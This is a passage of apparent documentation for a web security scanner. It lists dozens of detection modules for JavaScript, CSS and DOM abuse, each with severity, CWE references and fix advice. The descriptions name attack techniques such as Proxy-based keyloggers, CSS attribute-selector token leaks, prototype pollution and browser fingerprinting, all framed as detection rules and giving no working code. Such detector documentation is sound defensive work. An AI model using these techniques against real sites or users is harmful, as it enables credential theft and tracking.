defineProperty() getter transmits to fetch/analytics: every property read operation on the object triggers exfiltration defineProperty() setter exfiltrates write values via sendBeacon: property assignment captured (equivalent to Proxy-based keylogger) Object.freeze() on auth/permissions/policy object: verify freeze prevents tampering and is not bypassed via Object.assign/spread defineProperty() target or descriptor from URL parameter: attacker-controlled property definition enables object manipulation

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty) · [↗](https://cwe.mitre.org/data/definitions/200.html)

---

### 280. Object Spread / Assign Prototype Pollution
**Module:** `object_spread_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-1321** &nbsp;|&nbsp; **MITRE:** T1059.007

Detects Object.assign() merging attacker-controlled URL parameter content enabling prototype pollution, object spread with URL parameter content, Object.entries() exfiltration, and direct Object.assign() targeting Object.prototype/__proto__.

**How to fix:**
- Never use Object.assign() or spread with unvalidated URL parameter / JSON.parse() content
- Use Object.create(null) for merge targets to avoid prototype chain attacks
- Validate that merge targets are not Object.prototype or __proto__ before assignment
- Avoid transmitting Object.entries() of sensitive objects to remote endpoints

**References:** [↗](https://github.com/nicolo-ribaudo/tc39-proposal-json-parse-with-source) · [↗](https://cwe.mitre.org/data/definitions/1321.html)

---

### 281. Proxy / Reflect Security
**Module:** `proxy_reflect_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-200**

Proxy handler.get trap transmits property reads to analytics: all property accesses on proxied object exfiltrated (read surveillance) Proxy handler.set trap exfiltrates property write values via sendBeacon: object property assignments captured (Proxy-based keylogger) new Proxy() wraps password/credential/cookie object: sensitive data object intercepted — all operations on it monitored Proxy target from URL parameter: attacker-controlled proxy target enables arbitrary object interception

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy) · [↗](https://cwe.mitre.org/data/definitions/200.html)

---

### 282. Typed Array Security
**Module:** `typed_array_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-312**

Uint8Array containing password/token transmitted via fetch/sendBeacon: binary credential data exfiltrated using TypedArray encoding TypedArray initialized from URL parameter: attacker-controlled binary buffer content injection TypedArray memory buffer size transmitted: binary memory layout fingerprinting for device identification WebAssembly.Memory wrapped in Uint8Array and transmitted: complete WASM linear memory contents exfiltrated

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Typed_arrays) · [↗](https://cwe.mitre.org/data/definitions/312.html)

---

### 283. ArrayBuffer / DataView Security
**Module:** `array_buffer_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-385**

ArrayBuffer containing token/credential transmitted: binary-encoded sensitive data exfiltrated via raw buffer ArrayBuffer/DataView created from URL parameter: attacker-controlled buffer size enabling DoS or injection DataView.getUint8/getFloat64 results transmitted to analytics: binary memory value exfiltration SharedArrayBuffer with Atomics.store/load/notify: shared memory enables high-resolution timing attacks (Spectre-class vulnerability)

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer) · [↗](https://cwe.mitre.org/data/definitions/385.html)

---

### 284. Structured Clone Security
**Module:** `structured_clone_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-359**

Structured Clone/postMessage misuse — structuredClone() copies credentials for external transmission, cloned data posted to worker for processing, postMessage sends credentials to wildcard origin ('*') broadcasting to all frames.

**How to fix:**
- Do not use structuredClone() on credential-containing objects for the purpose of external transmission
- When posting cloned data to workers, ensure workers cannot transmit data to external destinations
- Never use postMessage with '*' origin when sending auth/credential data — specify exact target origin
- Implement postMessage receiver validation on the receiving end

**References:** [↗](https://html.spec.whatwg.org/multipage/structured-data.html) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 285. Regex Security — ReDoS & Injection
**Module:** `regex_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-1333** &nbsp;|&nbsp; **MITRE:** T1499.001

Detects attacker-controlled RegExp construction enabling ReDoS or regex injection, catastrophic backtracking patterns (.*)+/(\w+)+, .exec()/.match() result exfiltration, and regex result passed to eval() enabling code execution.

**How to fix:**
- Never construct RegExp from untrusted user input — validate and whitelist patterns
- Audit regex patterns for nested quantifiers that cause catastrophic backtracking
- Avoid transmitting regex match results to remote endpoints
- Never pass regex exec() results to eval() or Function() constructors

**References:** [↗](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) · [↗](https://cwe.mitre.org/data/definitions/1333.html)

---

### 286. Observable API Stream Security
**Module:** `observable_api_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-359**

Observable streaming credentials/tokens to remote endpoint: continuous exfiltration of auth material via reactive stream Observable source configured from URL parameter: attacker-controlled data injected into reactive stream processing ObservableEventTarget events transmitted to remote: DOM event surveillance via Observable-based covert channel Unbounded keydown/scroll/input Observable with sendBeacon: keystroke and interaction logger via reactive event stream

**References:** [↗](https://wicg.github.io/observable/) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 287. Readable Stream Security
**Module:** `readable_stream_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-201**

Readable Stream API misuse — stream containing credentials piped to external destination, stream piped to external URL/fetch, stream content from URL param, response tee'd with second copy exfiltrated.

**How to fix:**
- Validate Readable Stream pipeTo/pipeThrough destinations — never pipe to external URLs
- Do not create ReadableStream content from URL parameters
- Avoid tee()ing response streams and transmitting the second copy to external endpoints
- Monitor ReadableStream destinations with CSP connect-src restrictions

**References:** [↗](https://streams.spec.whatwg.org/) · [↗](https://cwe.mitre.org/data/definitions/201.html)

---

### 288. Promise Security
**Module:** `promise_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-312**

Promise.resolve()/new Promise() resolves with password/token/credential: sensitive data propagated through async promise chain to consumers .then() handler transmits credentials via fetch/sendBeacon: promise resolution triggers immediate credential exfiltration unhandledrejection event transmitted to remote: rejection reasons including error messages and stack traces exfiltrated Promise created/resolved with URL parameter value: attacker-controlled promise resolution value injected into async flow

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise) · [↗](https://cwe.mitre.org/data/definitions/312.html)

---

### 289. Generator / Iterator Security
**Module:** `generator_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-200**

yield expression triggers fetch/sendBeacon: generator used to stream batches of data to remote endpoint on each iteration yield produces password/token/credential/cookie values: sensitive data streamed via generator to consuming code while(true) generator continuously yields and fetches: infinite generator loop used for continuous background data exfiltration Generator function content from URL parameter: attacker-controlled iterator sequence injection

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/function*) · [↗](https://cwe.mitre.org/data/definitions/200.html)

---

### 290. Iterator Protocol Data Exfiltration
**Module:** `iterator_protocol_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-922** &nbsp;|&nbsp; **MITRE:** T1005

Detects [Symbol.iterator]/Array.from() result exfiltration, Array.from() from URL parameters enabling sequence injection, iterating over credential-containing objects, and .next() result transmission to remote endpoints.

**How to fix:**
- Audit Array.from() and spread operations over sensitive iterables for network leakage
- Validate Array.from() source — never construct iterable sequences directly from URL parameters
- Do not transmit .next() return values to remote endpoints without validation

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Iteration_protocols) · [↗](https://cwe.mitre.org/data/definitions/922.html)

---

### 291. Map / Set Credential Exfiltration
**Module:** `map_set_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-312** &nbsp;|&nbsp; **MITRE:** T1005

Detects new Map() initialized with credentials, .entries() exfiltration of complete Map contents, Map/Set construction from URL parameters, and Map used as a credential collection buffer for exfiltration.

**How to fix:**
- Never initialize Map with raw credential values — use ephemeral variables instead
- Audit .entries()/.values()/.keys() calls for network transmission of sensitive collections
- Validate Map/Set constructor arguments — never source initial entries from URL parameters

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map) · [↗](https://cwe.mitre.org/data/definitions/312.html)

---

### 292. Date / Time Fingerprinting & Manipulation
**Module:** `date_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-203** &nbsp;|&nbsp; **MITRE:** T1592

Detects getTimezoneOffset() exfiltration for geolocation fingerprinting, toLocaleString()/Intl.DateTimeFormat locale exfil, new Date() from URL parameters enabling date manipulation, and timing oracles around authentication operations.

**How to fix:**
- Do not transmit timezone offset or locale to third-party analytics without explicit user consent
- Validate and sanitize date parameters from URL before passing to new Date()
- Avoid using Date.now()/performance.now() timing patterns around authentication that could reveal timing information

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/Date/getTimezoneOffset) · [↗](https://cwe.mitre.org/data/definitions/203.html)

---

### 293. Intl API Fingerprinting
**Module:** `intl_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-359** &nbsp;|&nbsp; **MITRE:** T1592

Detects navigator.languages/language exfiltration revealing user geographic location, Intl.Collator locale-specific sort behavior fingerprinting, Intl.NumberFormat locale fingerprinting, and Intl API locale injection from URL parameters.

**How to fix:**
- Do not transmit navigator.languages or Intl API locale results to analytics without consent
- Treat Intl API results as privacy-sensitive — locale reveals geographic location and language preferences
- Validate Intl API locale parameters — never source locale directly from URL parameters

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Intl) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 294. ReDoS — Regex Denial of Service Risk
**Module:** `redos_passive` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-1333**

Catastrophic backtracking regex (a+)+ causes exponential CPU usage with crafted input — single-threaded DoS Dynamic RegExp construction from user input allows an attacker to supply a malicious pattern Server-side ReDoS can freeze the event loop (Node.js) or consume all CPU for seconds/minutes Client-side ReDoS freezes the browser tab, degrading user experience and enabling sustained DoS

**How to fix:**
- Audit all regex patterns with safe-regex or vuln-regex-detector in CI
- Use the re2 library (Google RE2) for server-side regex — guaranteed O(n) time
- Never construct RegExp from user-supplied strings; use literal patterns only
- Add input length limits before regex application as defense-in-depth

---

### 295. AbortController / AbortSignal Security
**Module:** `abort_controller_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-362**

AbortController configured from URL parameter: attacker controls which requests are cancelled, denying service selectively AbortSignal.timeout() + performance.now() timing oracle: network abort timing used to infer server-side processing state AbortSignal on auth/session fetch: authentication request race-cancelled before completing, partial token issuance controller.abort() called while fetch in-flight: race condition in request cancellation leaves state inconsistent

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/AbortController) · [↗](https://cwe.mitre.org/data/definitions/362.html)

---

### 296. Symbol / Well-Known Symbol Security
**Module:** `symbol_security` &nbsp;|&nbsp; **Severity:** 🟢 LOW
**CWE-200**

[Symbol.toPrimitive] trap transmits data via fetch/sendBeacon: type coercion interception triggers exfiltration on implicit conversion Object.getOwnPropertySymbols() results transmitted: symbol-keyed property enumeration reveals hidden object structure [Symbol.toStringTag] sourced from URL parameter: attacker-controlled type tag spoofs object toString() output Symbol.keyFor() results transmitted to analytics: global Symbol registry probed to fingerprint which libraries are present

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol) · [↗](https://cwe.mitre.org/data/definitions/200.html)

---

### 297. WeakMap / WeakRef / FinalizationRegistry Security
**Module:** `weakmap_security` &nbsp;|&nbsp; **Severity:** 🟢 LOW
**CWE-312**

WeakMap.set() stores password/token/credential values: sensitive data cached in WeakMap keyed to DOM elements — survives GC if element is live WeakRef.deref() result transmitted via fetch/sendBeacon: dereferenced weak reference value exfiltrated to remote FinalizationRegistry callback transmits data to remote: GC finalization callbacks used to exfiltrate object lifecycle telemetry new WeakMap() initialized from URL parameter: attacker-controlled initial WeakMap entries

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/WeakMap) · [↗](https://cwe.mitre.org/data/definitions/312.html)

---

## CSS & UI Security

*19 scanners in this category.*

### 298. Css Houdini Security
**Module:** `css_houdini_security` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-94**

CSS Houdini API misuse — paintWorklet module URL from URL parameter (arbitrary worklet code execution), worklet loaded from external domain (third-party CSS code execution), CSS.registerProperty from URL param (property injection), registerPaint worklet contains fetch (data exfiltration from paint context).

**How to fix:**
- Never source CSS worklet module URLs from URL parameters or user input
- Restrict CSS worklet loading to same-origin or trusted domains only
- Do not pass URL parameter values to CSS.registerProperty() calls
- Audit registerPaint/registerLayout worklets for fetch/network calls that could exfiltrate data

**References:** [↗](https://drafts.css-houdini.org/css-paint-api/) · [↗](https://cwe.mitre.org/data/definitions/94.html)

---

### 299. CSS Data Exfiltration Attack Surface
**Module:** `css_exfiltration` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-200**

CSS attribute selectors + background-url: leak CSRF tokens byte-by-byte without JavaScript CSS @import of external URLs loads attacker-controlled stylesheets with exfiltration rules No style-src CSP restriction with CSRF tokens: any CSS injection can target form field values unsafe-inline in style-src with CSRF tokens: injected inline CSS can exfiltrate secrets External stylesheets without SRI: CDN compromise injects CSS exfiltration rules globally

**How to fix:**
- Add style-src 'self' to CSP and remove 'unsafe-inline'; use nonces/hashes for inline styles
- Never allow user-controlled content inside <style> blocks or inline style= attributes
- Add SRI integrity to all external stylesheet <link> tags
- Use font-src directive in CSP to restrict @font-face source URLs
- Consider using CSS nonce-based approach to block injected stylesheets

---

### 300. Css Custom Properties Security
**Module:** `css_custom_properties_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-79**

CSS Custom Properties misuse — CSS variable value set from URL parameter (variable injection), var() inside url() pointing to external domain (CSS-based exfiltration request), getPropertyValue() reads security-sensitive variable and transmits to remote, CSS variable injected via style attribute.

**How to fix:**
- Never set CSS custom property values from URL parameters or user-controlled input
- Do not use CSS var() inside url() that points to user-controlled or external domains
- Audit getPropertyValue() calls on security-sensitive CSS variables for data leakage
- Sanitize all user input before it is applied to element style attributes or CSS text

**References:** [↗](https://www.w3.org/TR/css-variables-1/) · [↗](https://cwe.mitre.org/data/definitions/79.html)

---

### 301. Css Cascade Layers Security
**Module:** `css_cascade_layers_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-79**

CSS Cascade Layers misuse — @layer name/content sourced from URL parameter (cascade injection), @layer injected via insertRule/innerHTML, !important in @layer near auth/token elements (cascade priority bypass), layer order controlled from URL parameter.

**How to fix:**
- Never construct @layer rule names from URL parameters or user-controlled input
- Do not inject @layer rules via insertRule or innerHTML with user-provided values
- Audit @layer usage that uses !important near authentication or token-related UI elements
- Implement CSP style-src to prevent dynamic CSS injection attacks

**References:** [↗](https://www.w3.org/TR/css-cascade-5/) · [↗](https://cwe.mitre.org/data/definitions/79.html)

---

### 302. Css Container Query Security
**Module:** `css_container_query_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-79**

CSS Container Query misuse — container-name/@container rule sourced from URL parameter (cascade injection), @container injected via insertRule/innerHTML, @container applies external url() (CSS exfiltration via request), container size breakpoint triggers analytics (viewport fingerprinting).

**How to fix:**
- Never source CSS container names or @container rule content from URL parameters
- Do not inject @container rules via insertRule or innerHTML with user-controlled values
- Audit @container rules for url() functions pointing to external domains
- Implement CSP style-src to prevent dynamic CSS injection attacks

**References:** [↗](https://www.w3.org/TR/css-contain-3/) · [↗](https://cwe.mitre.org/data/definitions/79.html)

---

### 303. Css Nesting Security
**Module:** `css_nesting_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-79**

CSS Nesting misuse — @nest/& selector sourced from URL parameter (nested CSS injection), nested rule injected via insertRule/innerHTML, nested CSS rule uses url() on external domain (CSS exfiltration via nested selector), CSSNestingRule selector from URL parameter.

**How to fix:**
- Never source CSS nesting selectors (@nest/&) from URL parameters or user-controlled input
- Do not inject nested CSS rules via insertRule or innerHTML with user-provided content
- Audit nested CSS rules for url() functions pointing to external domains
- Implement CSP style-src to prevent dynamic nested CSS injection attacks

**References:** [↗](https://www.w3.org/TR/css-nesting-1/) · [↗](https://cwe.mitre.org/data/definitions/79.html)

---

### 304. Css Scope Security
**Module:** `css_scope_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-79**

CSS @scope misuse — @scope selector sourced from URL parameter (attacker-controlled scope injection), @scope rule injected via insertRule/innerHTML (dynamic CSS scope manipulation), adoptedStyleSheets state transmitted to remote, CSSStyleSheet.replace() content from URL parameter (constructable stylesheet injection).

**How to fix:**
- Never source @scope rule selectors from URL parameters or user-controlled input
- Do not inject @scope rules via insertRule or innerHTML with user-provided content
- Audit adoptedStyleSheets usage for unintended data transmission
- Never pass URL parameter values as content to CSSStyleSheet.replace() or replaceSync()

**References:** [↗](https://www.w3.org/TR/css-cascade-6/#scope-atrule) · [↗](https://cwe.mitre.org/data/definitions/79.html)

---

### 305. CSS Houdini Paint Worklet Abuse
**Module:** `css_paint_api_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-829**

Worklet from URL param: paintWorklet.addModule(URL_PARAM) loads attacker-controlled worklet script — arbitrary code execution in paint worklet origin CSS property from URL param: style.setProperty('--data', URL_PARAM) feeds attacker-controlled data into paint worklet — attacker controls rendering via URL CSS property exfiltrated: paint worklet inputProperties values transmitted to remote — CSS custom property contents (including sensitive data) sent to attacker server Paint timing oracle: worklet paint timing measured and transmitted — rendering time reveals content layout, element sizes, or data presence DOM access attempt: paint worklet code references document/window — indicates prototype pollution bypass attempt in worklet sandbox

**How to fix:**
- Never derive paint worklet module URLs from user input — hardcode module paths
- Sanitize CSS custom property values set from URL parameters before they enter paint worklet scope
- Paint worklets must not make network requests with inputProperties values
- Restrict paint worklet module sources with a strict CSP worker-src directive
- Monitor for DOM property access patterns in paint worklets — they should never access document or window

**References:** [↗](https://www.w3.org/TR/css-houdini-drafts/#paintrenderingcontext2d) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/CSS_Painting_API)

---

### 306. CSS Typed Object Model Security
**Module:** `css_typed_om_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-94**

CSS.px/em/percent value from URL parameter: attacker-controlled typed CSS numeric values injected into element style computedStyleMap() results transmitted to remote: typed computed CSS values used for cross-origin style surveillance Typed CSS values used for device fingerprinting: DPI, font size, and zoom level reveal platform/device characteristics attributeStyleMap.set() with innerHTML/userInput: typed CSS property set to attacker-controlled untrusted content

**References:** [↗](https://drafts.css-houdini.org/css-typed-om/) · [↗](https://cwe.mitre.org/data/definitions/94.html)

---

### 307. CSS Custom Highlight API Tracking / Injection
**Module:** `css_custom_highlight_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-200**

Highlight range from URL param: Range created from URL parameter fragment/hash — attacker highlights specific page text via URL crafting (text fragment equivalent) Highlight name from URL param: CSS.highlights.set() called with attacker-controlled name — attacker selects which CSS ::highlight() pseudo-element styles apply User selection tracking: getSelection() result converted to Custom Highlight — page records what text content the user highlighted or selected Highlighted text exfiltrated: highlighted or selected text content transmitted to remote — reading pattern and selected content surveillance Server-controlled highlights: highlights created from server-fetched data — server can remotely highlight or visually emphasize arbitrary page content

**How to fix:**
- Never create Range objects from URL hash or search parameters for highlight purposes
- Do not transmit selected or highlighted text to analytics or remote endpoints without explicit user consent
- Sanitize CSS.highlights.set() name parameter if derived from any external input
- Audit server-fetched highlight data for injection of misleading or phishing highlight ranges
- Implement CSP to restrict script execution that reads user selection state

**References:** [↗](https://www.w3.org/TR/css-highlight-api-1/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/CSS_Custom_Highlight_API)

---

### 308. CSS Math Function Injection
**Module:** `css_math_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-94**

calc()/min()/max()/clamp() values derived from URL parameters: attacker injects arithmetic layout expressions env(safe-area-inset-*) queried and transmitted to remote: device safe-area geometry used for device fingerprinting CSS math expression injected via setAttribute: attacker-controlled arithmetic overrides layout constraints

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/CSS/calc) · [↗](https://cwe.mitre.org/data/definitions/94.html)

---

### 309. CSS Masonry Layout Injection
**Module:** `css_masonry_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-94**

CSS masonry grid property sourced from URL parameter: attacker injects arbitrary layout rules via query string Masonry layout injected via insertRule/innerHTML/setAttribute: dynamic layout manipulation by attacker-controlled content masonryAutoFlow state transmitted to remote: masonry layout behaviour used as covert fingerprinting channel

**References:** [↗](https://drafts.csswg.org/css-grid-3/) · [↗](https://cwe.mitre.org/data/definitions/94.html)

---

### 310. Css Font Palette Security
**Module:** `css_font_palette_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-359**

CSS Font Palette / FontFace API misuse — FontFace constructed from URL parameter (attacker-controlled font injection), FontFace loaded from external domain (third-party font tracking via request), document.fonts properties enumerated and transmitted (font-based fingerprinting), @font-palette-values injected via insertRule.

**How to fix:**
- Never construct FontFace objects from URL parameters or user-controlled input
- Restrict external font loading with font-src CSP directives
- Do not transmit document.fonts enumeration results to remote analytics endpoints
- Audit @font-palette-values injection via insertRule for user-controlled values

**References:** [↗](https://www.w3.org/TR/css-fonts-4/) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 311. Color Scheme / Media Preference Fingerprinting
**Module:** `color_scheme_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-359**

prefers-color-scheme matchMedia result transmitted: dark/light mode preference used as cross-site persistent fingerprint prefers-reduced-motion/contrast/forced-colors batch probed and transmitted: full OS accessibility preference profile leaked forced-colors accessibility state exfiltrated: accessibility-mode detection used for user profiling color-scheme preference controlled via URL parameter: attacker-controlled theme override

**References:** [↗](https://www.w3.org/TR/mediaqueries-5/) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 312. Browser Fingerprinting API Usage
**Module:** `canvas_fingerprinting` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-359**

Canvas fingerprinting: hardware rendering differences identify users across sessions without cookies WebGL RENDERER/VENDOR: GPU model uniquely identifies a device across origins and sessions AudioContext fingerprinting: DAC/driver differences create sub-millisecond unique values Battery status API: charge level uniquely identifies a device (deprecated in most browsers) navigator.hardwareConcurrency + deviceMemory: hardware profile creates stable long-term identifier

**How to fix:**
- Audit all fingerprinting usage — determine if it is necessary or if pseudonymous alternatives exist
- Disclose fingerprinting in privacy policy if used for tracking; obtain user consent (GDPR Art. 6)
- Avoid combining multiple fingerprinting signals — each addition increases uniqueness exponentially
- Consider privacy-preserving alternatives: server-side session tokens, explicit user consent flows
- Modern browsers (Firefox, Brave, Safari) randomize canvas and audio output to mitigate tracking

---

### 313. CSS Custom Highlight API Security
**Module:** `highlight_api_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-94**

Highlight range sourced from URL parameter: attacker-controlled text selection range applied via CSS Highlight API Highlight registry state transmitted to remote: CSS.highlights used as covert data exfiltration channel Highlight applied to password/token/SSN content: sensitive text fields targeted via programmatic highlight range Highlight registry combined with innerHTML/document.write: DOM injection coupled with highlight manipulation

**References:** [↗](https://www.w3.org/TR/css-highlight-api-1/) · [↗](https://cwe.mitre.org/data/definitions/94.html)

---

### 314. CSS Grid Security
**Module:** `css_grid_security` &nbsp;|&nbsp; **Severity:** 🟢 LOW
**CWE-79**

grid-template-areas/columns/rows from URL parameter: attacker-controlled CSS grid layout injection enabling UI redressing CSS Grid template injected via insertRule/innerHTML/setAttribute: dynamic grid manipulation via DOM injection performance.now() timing around grid layout changes with fetch: CSS Grid timing oracle for cross-origin state inference grid-area value from URL parameter: attacker-controlled element placement within CSS Grid container

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Grid_Layout) · [↗](https://cwe.mitre.org/data/definitions/79.html)

---

### 315. CSS Counter Security
**Module:** `css_counter_security` &nbsp;|&nbsp; **Severity:** 🟢 LOW
**CWE-200**

counter() value embedded in CSS url() or content: counter-based side-channel leaks element state to attacker-controlled endpoint counter-reset/increment value from URL parameter: attacker-controlled CSS counter state CSS counter injected via insertRule/innerHTML: dynamic counter manipulation via DOM injection CSS counter names reference password/token/auth elements: sensitive element enumeration via counter naming conventions

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/CSS/counter) · [↗](https://cwe.mitre.org/data/definitions/200.html)

---

### 316. CSS Transitions / Animations Security
**Module:** `css_transitions_security` &nbsp;|&nbsp; **Severity:** 🟢 LOW
**CWE-385**

transitionend/transitionstart timing transmitted via fetch: CSS transition timing used as cross-origin side-channel oracle transition-duration value from URL parameter: attacker-controlled animation timing enables DoS via infinite/slow transitions CSS transition/animation injected via insertRule/innerHTML: dynamic CSS animation manipulation via DOM injection @keyframes content from URL parameter: attacker-controlled animation sequence injection via CSS

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Transitions) · [↗](https://cwe.mitre.org/data/definitions/385.html)

---

## DOM & Web Components

*40 scanners in this category.*

### 317. Declarative Shadow DOM Security
**Module:** `declarative_shadow_dom_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-79**

setHTMLUnsafe()/shadowrootmode from URL parameter: attacker-controlled shadow root content injection Script/eval/innerHTML inside open shadow root: JavaScript execution achieved within shadow DOM boundary Shadow DOM hosts credentials and transmits them remotely: sensitive form data harvested via shadow root setHTMLUnsafe() with user-controlled innerHTML: bypass of browser's built-in HTML sanitization

**References:** [↗](https://html.spec.whatwg.org/multipage/scripting.html#the-template-element) · [↗](https://cwe.mitre.org/data/definitions/79.html)

---

### 318. Custom Elements Security
**Module:** `custom_elements_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-1321**

Custom Elements misuse — HTMLElement.prototype modified from URL parameter (prototype pollution), customElements.define() tag name from URL param (element registration injection), Shadow DOM used to exfiltrate credentials.

**How to fix:**
- Never modify HTMLElement.prototype or customElements using user-controlled URL parameter data
- Hardcode custom element tag names — never source from URL parameters
- Audit Shadow DOM content within custom elements for credential or PII access
- Use Content-Security-Policy to restrict fetch/beacon destinations from custom element logic

**References:** [↗](https://html.spec.whatwg.org/multipage/custom-elements.html) · [↗](https://cwe.mitre.org/data/definitions/1321.html)

---

### 319. Custom Element Registry Security
**Module:** `custom_element_registry_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-79**

customElements.define() tag name from URL parameter: attacker-controlled custom element registration enables prototype pollution customElements.define() registers builtin elements (input/form/button): builtin HTML element behaviour override attack connectedCallback() exfiltrates document/shadowRoot/innerHTML to remote: custom element lifecycle used for DOM exfiltration attributeChangedCallback() processes URL params/innerHTML/eval: attacker-controlled attribute triggers code execution

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/CustomElementRegistry) · [↗](https://cwe.mitre.org/data/definitions/79.html)

---

### 320. Web Components Shadow DOM Injection
**Module:** `web_components_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-79** &nbsp;|&nbsp; **MITRE:** T1059.007

Detects shadow DOM innerHTML injection from URL parameters, attacker-controlled template cloning, slotted node exfiltration via .assignedNodes(), and open-mode shadow DOM hosting credential-handling components.

**How to fix:**
- Never set shadowRoot.innerHTML from URL parameters — use DOM APIs or sanitize input
- Use {mode: 'closed'} for shadow DOM hosting sensitive content to prevent external script access
- Audit .assignedNodes()/.assignedElements() for network transmission
- Sanitize template content before cloning into the document

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/Web_components/Using_shadow_DOM) · [↗](https://cwe.mitre.org/data/definitions/79.html)

---

### 321. ElementInternals API Security
**Module:** `element_internals_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-20**

setFormValue() sourced from URL parameter: attacker-controlled form submission value via custom element internals ElementInternals form value contains credentials transmitted remotely: sensitive data exfiltrated through custom form element setValidity({}) with empty flags: custom element bypasses all form constraint validation silently internals.form.action modified dynamically: form submission endpoint hijacked via ElementInternals API

**References:** [↗](https://html.spec.whatwg.org/multipage/custom-elements.html#the-elementinternals-interface) · [↗](https://cwe.mitre.org/data/definitions/20.html)

---

### 322. Popover API Security
**Module:** `popover_api_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-79**

URL parameter flows into popover content before showPopover(): attacker controls popover displayed content via query string Popover opened displaying auth/login/payment content: popover UI used to present fake credential or payment form innerHTML/insertAdjacentHTML before showPopover(): unsanitized HTML injected into popover without sanitization showPopover() triggered automatically on page load: popover shown without user gesture violating security UX

**References:** [↗](https://html.spec.whatwg.org/multipage/popover.html) · [↗](https://cwe.mitre.org/data/definitions/79.html)

---

### 323. Dialog Element Security
**Module:** `dialog_element_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-79**

URL parameter content flows into showModal(): attacker-controlled text displayed in trusted modal dialog showModal() displays auth/login/payment form: native modal dialog spoofed as browser-trusted credential prompt innerHTML injected before showModal(): unsanitized HTML executed in modal dialog context dialog.returnValue transmitted to remote: form result (user input to dialog) exfiltrated to analytics

**References:** [↗](https://html.spec.whatwg.org/multipage/interactive-elements.html#the-dialog-element) · [↗](https://cwe.mitre.org/data/definitions/79.html)

---

### 324. Inert Attribute Security
**Module:** `inert_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-1021**

inert applied to form/login/auth elements: all interaction with authentication UI programmatically blocked inert combined with iframe/overlay/z-index: clickjacking variant using inert to prevent interaction with obscured legitimate UI inert attribute controlled by URL parameter: attacker disables specific UI elements via query string manipulation inert removed via URL parameter: attacker re-enables previously hidden or disabled UI elements

